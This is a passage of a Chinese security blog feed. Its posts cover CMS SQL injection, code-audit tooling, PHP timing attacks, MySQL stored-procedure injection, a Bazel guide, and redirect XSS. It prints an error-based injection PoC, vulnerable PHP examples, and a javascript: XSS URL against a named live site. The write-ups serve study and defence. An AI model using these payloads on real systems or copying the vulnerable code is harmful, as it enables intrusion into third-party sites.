+<p>我们首先尝试搜索<code>select</code>这个危险函数
+<img src="https://i.loli.net/2019/12/01/bESAda8WwYgD4TJ.png" alt="2019-12-01 23-37-20 的屏幕截图.png" /></p>
+
+<p>虽然都不需要引号 但只有最后一处是可控的.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">		empty($_REQUEST[&#39;selcart&#39;])?messagebox(Lan(&#39;goods_least_one&#39;)):$selcart=yytrim($_REQUEST[&#39;selcart&#39;]);
+		empty($_REQUEST[&#39;num&#39;])?messagebox(Lan(&#39;error_parameter&#39;)):$numarray=yytrim($_REQUEST[&#39;num&#39;]);
+	    $cartstr=implode(&#34;,&#34;,$selcart);
+	    $cartlist=$this-&gt;db-&gt;select(&#34;select * from `#yunyecms_cart` where userid={$member[&#34;id&#34;]} and id in($cartstr) order by addtime desc&#34;);</code></pre></td></tr></table>
+</div>
+</div>
+<p>很明显的漏洞 这cms还没报错处理 随便写点就报错了 .</p>
+
+<p><img src="https://i.loli.net/2019/12/02/9ecnhR7oTtwSuYH.png" alt="2019-12-02 00-47-18 的屏幕截图.png" /></p>
+]]></content></item><item><title>Code Audit</title><link>https://blue-bird1.github.io/posts/code-audit/</link><pubDate>Tue, 26 Nov 2019 12:56:55 +0800</pubDate><guid>https://blue-bird1.github.io/posts/code-audit/</guid><description>前言 代码审计是白盒测试的重要部分,对它的自动化探索也从未停止,但是在现实环境复杂度下现有的工具 实用性并不用.只能实现发现简单漏洞.本文讨论现</description><content type="html"><![CDATA[
+
+<h3 id="前言">前言</h3>
+
+<p>代码审计是白盒测试的重要部分,对它的自动化探索也从未停止,但是在现实环境复杂度下现有的工具 实用性并不用.只能实现发现简单漏洞.本文讨论现有的代码审计工具和理论.</p>
+
+<h3 id="自动化代码审计">自动化代码审计</h3>
+
+<p>介绍常见的自动化审计</p>
+
+<h4 id="静态分析">静态分析</h4>
+
+<p>最简单的方法自然是不对代码进行分析  直接进行正则匹配,发现危险模式.例如</p>
+
+<pre><code>eval($GET['xxx'])
+</code></pre>
+
+<p>自然就是一种危险模式,缺点不然而喻误报率高 检测率低.  优点则是容易实现 很简单就能集成到ci上,作为一种代码规范 自动不需要考虑误报率这个问题了.
+(检测出来就是你代码不符合安全规范)</p>
+
+<h4 id="污点分析">污点分析</h4>
+
+<p>污点分析在安全人员的手工审计思路上可以体现为 先搜一下危险函数, 然后看看危险函数参数可不可控,在分析可不可控中 需要看之前的代码.</p>
+
+<p>以下是现有工具的基本实现逻辑
+污点分析基于对代码路径的分析,首先也需要标记危险函数和输入源(在php一般可以认为是$GET, $POST, $COOKIES).
+和安全函数 然后对代码进行解析 生成语法树. 这方面已经有多个库实现了.
+再寻找标记的危险函数和其参数, 然后参数就是输入源 基本可以确认是漏洞了. 如果不是 需要进行回溯 确认这个参数的来源. 在这个过程如果遇到安全函数进行过滤,则可以认为这里不存在漏洞.</p>
+
+<p>污点分析理论上是没有问题 只是一种审计思路 当然在代码实现上存在一些问题.
+例如安全函数过滤后并不能真的确认没有问题了, 换做真人审计肯定是要确认这些函数的效果.  这个问题在mvc框架下非常明显, 框架使用的安全函数太多了.</p>
+
+<h4 id="语义分析">语义分析</h4>
+
+<p>要解决上面的问题, 彻底解析所有php代码,但基础函数并不能分析,必须提供基础函数的数据. 理解这些代码到底起了什么作用.</p>
+
+<p>最后代码审计工具只需要声明 某函数不应该可以输入什么样的参数.例如 echo函数 不应可以输入 <code>&lt;xxx&gt;</code>的参数.
+这里的判断可以归结于一个 约束求解. 首先一个外部输入源是不存在约束的,可以任意输入 然后例如通过intval函数后添加了一个约束 这个参数只能是<code>0-9</code>.
+显然这种约束后 是不可能存在<code>&lt;xxx&gt;</code>的解的.</p>
+
+<p>这种方法的优势很明显 但是实现非常困难 光是语义分析就没有已实现的例子.</p>
+
+<h3 id="结尾">结尾</h3>
+
+<p>本文总结了常见的自动代码审计实现,但自动化归自动化. 我们安全人员在审计时需要考虑这次审计对自身技术有提升么?重复在一些低劣cms上审计 固然是容易挖漏洞刷cve 但是对自身技术没什么帮助.</p>
+
+<h3 id="参考">参考</h3>
+
+<p><a href="http://blog.fatezero.org/2018/11/11/prvd/">http://blog.fatezero.org/2018/11/11/prvd/</a>
+<a href="https://wooyun.js.org/drops/PHP%E8%87%AA%E5%8A%A8%E5%8C%96%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0.html">https://wooyun.js.org/drops/PHP%E8%87%AA%E5%8A%A8%E5%8C%96%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0.html</a></p>
+]]></content></item><item><title>时间攻击</title><link>https://blue-bird1.github.io/posts/time-attack/</link><pubDate>Fri, 22 Nov 2019 01:17:28 +0800</pubDate><guid>https://blue-bird1.github.io/posts/time-attack/</guid><description>前言 对于本篇博客的标题 读者应该都不陌生了 毕竟大名鼎鼎的cpu漏洞就有利用这种侧信道攻击的. 这种攻击的难度也很大,但是作为一种攻击却是挺有意思</description><content type="html"><![CDATA[
+
+<h3 id="前言">前言</h3>
+
+<p>对于本篇博客的标题 读者应该都不陌生了 毕竟大名鼎鼎的cpu漏洞就有利用这种侧信道攻击的.
+这种攻击的难度也很大,但是作为一种攻击却是挺有意思的.攻击面也很广泛 因为只要是代码必然涉及到执行时间这个问题,只是差异有没有大到可以被攻击者检测出来的问题而已.</p>
+
+<h3 id="php的字符串时间攻击">php的字符串时间攻击</h3>
+
+<p>这应该离web最近的了 这种漏洞在cve也有 如CVE-2019-18887</p>
+
+<p>用一个最简单的代码举例</p>
+
+<pre><code>$secret = &quot;thisismykey&quot;;
+if ($_GET['secret'] !== $secret) {
+    die(&quot;Not Allowed!&quot;);
+}
+</code></pre>
+
+<p>本质的问题是 php的字符串比较是用以下伪代码实现的</p>
+
+<pre><code>// str1 and str2 cmp
+if len(str1) != len(str2){
+   return false
+}
+for x, y in zip(str1, str2){
+   if x != y {
+     return flase
+   }
+}
+
+return true
+
+</code></pre>
+
+<p>首先比较长度 不相同直接返回. 然后再比较各个字符.很显然如果长度不一样 将不会执行下面的代码 花的时间将会短一些. 可以通过比较时间来判断字符串的长度.</p>
+
+<p>以现在的cpu速度 一个比较的时间几乎可以忽略不计. 也存在速度上的波动,但是只要尝试足够多的次数并平均(平均值总将趋向期望值) 总将可以猜测出它的长度和内容.</p>
+
+<h3 id="分支攻击">分支攻击</h3>
+
+<p>如果不使用php默认的字符串比较呢.时间攻击几乎不可避免的.
+执行不同的代码可能导致执行时间不一致的分支几乎在所有代码中存在, 只要你使用了分支 执行的代码时间不一致 就可以进行猜测.
+例如预先判断用户存在再判断密码的两条分支就可能进行用户枚举</p>
+
+<pre><code>// 一些查询用户是否存在的操作
+if (user){
+    // 登录操作
+}
+else {
+return
+}
+
+</code></pre>
+
+<h3 id="缓存">缓存</h3>
+
+<p>上面的差异时间都比较小 而缓存造成的时间差异是非常显著的. 在开发时必须考虑缓存是否会导致时间攻击.这在web上问题比较少见,但是在硬件层面比较多.
+例如cpu的Meltdown漏洞 就利用缓存的侧信道攻击</p>
+
+<h3 id="防御">防御</h3>
+
+<p>时间攻击的本质就是输入数据导致代码执行时间不一致.处于安全绝对 我们只需要将代码的时间差异减少到一个足够的量级就行.
+对于字符串比较 在php可以通过一个函数解决 hash_equals 它使用相同的时间比较.
+对于分支攻击 只能在开发上注意了.</p>
+
+<p>###　参考
+<a href="https://blog.ircmaxell.com/2014/11/its-all-about-time.html">https://blog.ircmaxell.com/2014/11/its-all-about-time.html</a>
+<a href="https://eprint.iacr.org/2011/232.pdf">https://eprint.iacr.org/2011/232.pdf</a></p>
+]]></content></item><item><title>Mysql 储存过程注入</title><link>https://blue-bird1.github.io/posts/mysql/</link><pubDate>Tue, 07 May 2019 02:42:17 +0800</pubDate><guid>https://blue-bird1.github.io/posts/mysql/</guid><description>Mysql 储存过程注入 mysql有着储存过程这个功能, 这次作者刚好遇到注入点在调用储存过程的sql注入. 基本知识 mysql可以通过以下语句创建一个储</description><content type="html"><![CDATA[
+
+<h3 id="mysql-储存过程注入">Mysql 储存过程注入</h3>
+
+<p>mysql有着储存过程这个功能, 这次作者刚好遇到注入点在调用储存过程的sql注入.</p>
+
+<h3 id="基本知识">基本知识</h3>
+
+<p>mysql可以通过以下语句创建一个储存过程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">CREATE</span> <span class="k">PROCEDURE</span> <span class="nf">sp_name</span><span class="p">(</span><span class="k">IN</span> <span class="n">param1</span> <span class="kt">INT</span><span class="p">,</span><span class="k">OUT</span> <span class="n">param2</span> <span class="kt">INT</span><span class="p">)</span>
+<span class="n">BEGIN</span>
+   <span class="c1"># code
+</span><span class="c1"></span><span class="n">END</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>sp_name是名字, 为IN的参数是入参,为OUT的参数为返回值</p>
+
+<p>调用储存过程的语句</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"> <span class="k">CALL</span> <span class="nf">sp_name</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="注入分析">注入分析</h3>
+
+<p>从语法我们可以分析出我们的输入可能出现在两处,和作为参数进入储存过程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">CALL</span> <span class="o">&lt;</span><span class="err">储存过程名注入点</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&lt;</span><span class="err">储存过程参数注入点</span><span class="o">&gt;</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>首先如果对参数过滤不严,无需进入储存过程就可以直接注入.用以下语句为例</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">CALL</span> <span class="nf">test</span><span class="p">([</span><span class="err">可控点</span><span class="p">])</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>由于是直接执行,所以我们可直接注入语句例如<code>(select 1)</code>.由于语法问题,这个括号是必须的,这语句就变成了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">CALL</span> <span class="nf">test</span><span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">))</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>这种注入和普通注入差别不大,已有技巧基本可以套用.</p>
+
+<p>如果参数不可控,但是方法名可控也可以进行注入.但是首先要得知一个存在的储存过程名,然后通过注释后续语句来进行自己语句</p>
+
+<pre><code>CALL [可控]()
+</code></pre>
+
+<p>示例poc</p>
+
+<pre><code>test((select updatexml(1,concat(0x7e,(select @@version),0x7e),1))) -- 
+</code></pre>
+
+<p>可以看到和参数注入差距不大,只是用于参数不可控,或被安全处理的情况.</p>
+
+<p>最后一种可能,在储存过程中出现.虽然储存过程被认为非常安全,但是实际上如果编写不慎 例如进行动态sql拼接 还是会出现注入的.. 例如</p>
+
+<pre><code># 来自网上的一个例子 _field和_table是参数
+SET @strSql = CONCAT('SELECT ',_field,' FROM ',_table);
+PREPARE stmt FROM @strSql;
+EXECUTE stmt;
+</code></pre>
+
+<p>最后附上我遇上的一个漏洞代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="o">@</span><span class="nv">$m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span> <span class="s1">&#39;123456&#39;</span><span class="p">,</span> <span class="s1">&#39;UseStudio_Develop&#39;</span><span class="p">);</span>
+    <span class="cm">/*省略错误处理*/</span>
+    <span class="nv">$ary</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">]);</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$ary</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;CALL &#39;</span> <span class="o">.</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$ary</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;()&#39;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;CALL &#39;</span> <span class="o">.</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$ary</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&#34;(&#39;&#34;</span><span class="p">;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$ary</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$sql</span><span class="o">.=</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$ary</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$ary</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$sql</span><span class="o">.=</span> <span class="s2">&#34;&#39;,&#39;&#34;</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="nv">$sql</span><span class="o">.=</span> <span class="s2">&#34;&#39;)&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="c1">//执行查询，获取结果集
+</span><span class="c1"></span>    <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+    <span class="c1">// 省略返回的代码
+</span><span class="c1"></span><span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div>]]></content></item><item><title>在golang项目开始使用Bazel</title><link>https://blue-bird1.github.io/posts/go-bazel/</link><pubDate>Sat, 27 Apr 2019 19:32:12 +0800</pubDate><guid>https://blue-bird1.github.io/posts/go-bazel/</guid><description>在golang项目开始使用Bazel Bazel是一个由java编写的编译工具,支持多语言编译,扩展,远程缓存等大量功能. 下载 推荐通过http</description><content type="html"><![CDATA[
+
+<h1 id="在golang项目开始使用bazel">在golang项目开始使用Bazel</h1>
+
+<p><code>Bazel</code>是一个由java编写的编译工具,支持多语言编译,扩展,远程缓存等大量功能.</p>
+
+<h2 id="下载">下载</h2>
+
+<p>推荐通过<code>https://github.com/bazelbuild/bazel/releases</code>下载,</p>
+
+<p><code>wget https://github.com/bazelbuild/bazel/releases/download/0.24.1/bazel-0.24.1-installer-linux-x86_64.sh</code></p>
+
+<p>由于大家都知道的原因,下载速度很慢.建议在国外服务器下载</p>
+
+<h2 id="快速开始">快速开始</h2>
+
+<p><code>Bazel</code>使用两个特殊文件名 <code>WORKSPACE</code> 和<code>BUILD</code>定义项目.</p>
+
+<p><code>WORKSPACE</code>定义一个项目工作区,例如外部依赖和工具链,<code>BUILD</code>定义如何编译这个项目.允许用多个<code>BUILD</code>定义不同部分的编译操作.</p>
+
+<p>在项目创建一个<code>WORKSPACE</code>文件.然后需要载入Bazel的golang扩展 .以下均为官方基础例子</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 载入http_archive函数</span>
+<span class="n">load</span><span class="p">(</span><span class="s2">&#34;@bazel_tools//tools/build_defs/repo:http.bzl&#34;</span><span class="p">,</span> <span class="s2">&#34;http_archive&#34;</span><span class="p">)</span>
+
+<span class="c1"># 从github下载扩展</span>
+<span class="n">http_archive</span><span class="p">(</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;io_bazel_rules_go&#34;</span><span class="p">,</span>
+    <span class="n">urls</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;https://github.com/bazelbuild/rules_go/releases/download/0.18.3/rules_go-0.18.3.tar.gz&#34;</span><span class="p">],</span>
+    <span class="n">sha256</span> <span class="o">=</span> <span class="s2">&#34;86ae934bd4c43b99893fc64be9d9fc684b81461581df7ea8fc291c816f5ee8c5&#34;</span><span class="p">,</span>
+<span class="p">)</span>
+
+<span class="c1"># 从下载的扩展里载入 go_rules_dependencies go_register_toolchains 函数</span>
+<span class="n">load</span><span class="p">(</span><span class="s2">&#34;@io_bazel_rules_go//go:deps.bzl&#34;</span><span class="p">,</span> <span class="s2">&#34;go_rules_dependencies&#34;</span><span class="p">,</span> <span class="s2">&#34;go_register_toolchains&#34;</span><span class="p">)</span>
+
+<span class="c1"># 注册一堆常用依赖 如github.com/google/protobuf golang.org/x/net</span>
+<span class="n">go_rules_dependencies</span><span class="p">()</span>
+
+<span class="c1"># 下载golang工具链</span>
+<span class="n">go_register_toolchains</span><span class="p">()</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>一般来说都会使用gazelle工具来自动生成<code>BUILD</code>文件,而不是手写.添加以下加入<code>WORKSPACE</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># 下载 gazelle</span>
+http_archive<span class="o">(</span>
+    <span class="nv">name</span> <span class="o">=</span> <span class="s2">&#34;bazel_gazelle&#34;</span>,
+    <span class="nv">urls</span> <span class="o">=</span> <span class="o">[</span><span class="s2">&#34;https://github.com/bazelbuild/bazel-gazelle/releases/download/0.17.0/bazel-gazelle-0.17.0.tar.gz&#34;</span><span class="o">]</span>,
+    <span class="nv">sha256</span> <span class="o">=</span> <span class="s2">&#34;3c681998538231a2d24d0c07ed5a7658cb72bfb5fd4bf9911157c0e9ac6a2687&#34;</span>,
+<span class="o">)</span>
+
+<span class="c1"># 载入依赖</span>
+load<span class="o">(</span><span class="s2">&#34;@bazel_gazelle//:deps.bzl&#34;</span>, <span class="s2">&#34;gazelle_dependencies&#34;</span><span class="o">)</span>
+gazelle_dependencies<span class="o">()</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>在<code>BUILD</code>文件写入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">load<span class="o">(</span><span class="s2">&#34;@bazel_gazelle//:def.bzl&#34;</span>, <span class="s2">&#34;gazelle&#34;</span><span class="o">)</span>
+
+<span class="c1"># 下面这行是必要的注释 注明了你的包前缀 例如github.com/example/project</span>
+<span class="c1"># gazelle:prefix go-common</span>
+gazelle<span class="o">(</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&#34;go-common&#34;</span><span class="o">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>然后运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># 如果上面修改了名字 这里也需要修改</span>
+bazel run  //:gazelle</code></pre></td></tr></table>
+</div>
+</div>
+<p>成功输出如下</p>
+
+<pre><code>INFO: 0 processes.
+INFO: Build completed successfully, 1 total action
+INFO: Build completed successfully, 1 total action
+</code></pre>
+
+<p>进行编译</p>
+
+<pre><code>bazel build //...
+</code></pre>
+]]></content></item><item><title>XSS实战 跳转XSS</title><link>https://blue-bird1.github.io/posts/location-xss/</link><pubDate>Sat, 20 Apr 2019 12:43:40 +0800</pubDate><guid>https://blue-bird1.github.io/posts/location-xss/</guid><description>XSS实战: 跳转XSS 前言 跳转XSS实际上并不是一种新类型的攻击方式, 主要形成原因是 以前网站外部跳转时是直接接受参数然后跳转,导致了URL重</description><content type="html"><![CDATA[
+
+<h2 id="xss实战-跳转xss">XSS实战: 跳转XSS</h2>
+
+<h3 id="前言">前言</h3>
+
+<p>跳转XSS实际上并不是一种新类型的攻击方式,</p>
+
+<p>主要形成原因是 以前网站外部跳转时是直接接受参数然后跳转,导致了URL重定向漏洞.而现在网站喜欢加个跳转页,不会直接跳转,而是接受参数然后用js跳转. 这就有一个问题 如果未验证参数, js跳转时是可以接受JavaScript伪协议执行js代码的.</p>
+
+<h3 id="漏洞代码示例">漏洞代码示例</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-php+HTML" data-lang="php+HTML"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
+	echo &#34;&lt;script&gt;window.location.href = $_GET[&#39;url&#39;]&lt;/script&gt;&#34;;
+?&gt;</code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="实战例子">实战例子</h3>
+
+<p>以拉勾网为例,作者打开页面都会先看看js里有什么信息.很快发现js里有这段代码</p>
+
+<p><img src="https://i.loli.net/2019/04/20/5cbb2a45d44a9.png" alt="Screenshot_15.png" /></p>
+
+<p>显然只有有参数的才能引起兴趣.作者快速尝试了<code>https://sec.lagou.com/verify.html?e=test1&amp;f=test2</code></p>
+
+<p>发现url参数直接进入了页面,当然与本次主题有关的是参数<code>f</code>.虽然另一个更直接. 它在页面的位置是</p>
+
+<pre><code>    function submit1(data){
+        var host = &quot;test2&quot;;
+        $.ajax({
+            url: 'parseSession',
+            type: &quot;post&quot;,
+            dataType: &quot;json&quot;,
+            data: {
+                challenge: data.challenge,
+                errcode:1
+            },
+            success: function (result) {
+                window.location.href = host;
+            }
+        })
+
+        //$.getJSON('/user/sendCode.json', {t: new Date().getTime(), type: $('#contactSelect').val()}, function (data)
+    }
+</code></pre>
+
+<p>尝试引入双引号.被转义了.所以这个参数就没问题了么?并不是.下面的代码使用了这个参数进行跳转.</p>
+
+<p>可以使用<code>https://sec.lagou.com/verify.html?e=1&amp;f=JavaScript:alert(1)</code>弹框.</p>
+
+<h3 id="最后">最后</h3>
+
+<p>首先拉勾网是没有src的,别想了. 另外现在这个问题似乎已经修复了?访问 <a href="https://sec.lagou.com/parseSession会302.">https://sec.lagou.com/parseSession会302.</a>.</p>
+
+<p>e参数没修.e出现的代码为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript">    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#submit&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">showError</span><span class="p">(</span><span class="s1">&#39;请填写验证码&#39;</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;111111&#34;</span><span class="p">)</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">test1</span><span class="p">)</span>
+            <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+                <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;checkcode&#39;</span><span class="p">,</span>
+                <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;post&#34;</span><span class="p">,</span>
+                <span class="nx">dataType</span><span class="o">:</span> <span class="s2">&#34;json&#34;</span><span class="p">,</span>
+                <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
+                    <span class="nx">t</span><span class="o">:</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">(),</span>
+                    <span class="nx">code</span><span class="o">:</span> <span class="nx">code</span><span class="p">,</span>
+                    <span class="nx">errcode</span> <span class="o">:</span><span class="nx">test1</span><span class="p">;</span>
+                <span class="p">},</span>
+                <span class="nx">success</span><span class="o">:</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">state</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
